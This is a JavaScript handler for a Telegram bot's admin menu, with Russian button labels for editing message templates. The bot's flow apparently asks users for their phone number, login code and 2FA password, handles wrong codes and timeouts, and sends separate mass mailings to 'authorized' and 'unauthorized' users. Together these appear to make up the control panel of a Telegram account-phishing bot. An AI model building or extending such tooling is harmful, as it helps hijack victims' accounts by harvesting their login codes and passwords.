import { bot } from "../../index.js";
import template from "../../../database/schemas/template.js";

export default {
    name: "t",
    async exec(query, [id]) {
        const t = await template.findOne({ id });
        if(!t) return await bot.answerCallbackQuery(query.id, {
            text: "❌ Шаблон не найден"
        });

        await bot.editMessageCaption(query, `📁 Шаблон: \`${t.name}\`
Выберите какое сообщение хотите изменить`, {
            parse_mode: "Markdown",
            reply_markup: {
                inline_keyboard: [
                    [
                        {
                            text: `После нажатия /start`,
                            callback_data: `editt:${id}:start`
                        }
                    ],
                    [
                        {
                            text: `После ввода номера`,
                            callback_data: `editt:${id}:code`
                        }
                    ],
                    [
                        {
                            text: `После авторизации`,
                            callback_data: `editt:${id}:auth`
                        }
                    ],
                    [
                        {
                            text: `Требование 2fa`,
                            callback_data: `editt:${id}:password`
                        }
                    ],
                    [
                        {
                            text: `После неверного 2fa`,
                            callback_data: `editt:${id}:wrongPassword`
                        }
                    ],
                    [
                        {
                            text: `После неверного кода`,
                            callback_data: `editt:${id}:wrongCode`
                        }
                    ],
                    [
                        {
                            text: `Если код буквами`,
                            callback_data: `editt:${id}:NaNCode`
                        }
                    ],
                    [
                        {
                            text: `Просроченная авторизация`,
                            callback_data: `editt:${id}:timeout`
                        }
                    ],
                    [
                        {
                            text: `Ошибка авторизации`,
                            callback_data: `editt:${id}:error`
                        }
                    ],
                    [
                        {
                            text: `Ожидание кода`,
                            callback_data: `editt:${id}:wait`
                        }
                    ],
                    [
                        {
                            text: `Расслыка для авторизованых`,
                            callback_data: `editt:${id}:mailing1h`
                        }
                    ],
                    [
                        {
                            text: `Текст кнопки для авторизованых`,
                            callback_data: `editt:${id}:button`
                        }
                    ],
                    [
                        {
                            text: `Ссылка для авторизованых`,
                            callback_data: `editt:${id}:url`
                        }
                    ],
                    [
                        {
                            text: `Расслыка для не авторизованых`,
                            callback_data: `editt:${id}:mailing1hUnauth`
                        }
                    ],
                    [
                        {
                            text: `Текст кнопки для не авторизованых`,
                            callback_data: `editt:${id}:buttonUnauth`
                        }
                    ],
                    [
                        {
                            text: `Ссылка для не авторизованых`,
                            callback_data: `editt:${id}:urlUnauth`
                        }
                    ],
                    [
                        {
                            text: `Текст кнопки`,
                            callback_data: `editt:${id}:contact`
                        }
                    ],
                    [
                        {
                            text: '🗑 Удалить',
                            callback_data: `editt:${id}:delete`
                        },
                        {
                            text: '🔙 Назад',
                            callback_data: 'templates'
                        }
                    ]
                ]
            },
            message_id: query.message.message_id,
            chat_id: query.message.chat.id
        }, 'cdn/templates.png')
    }
}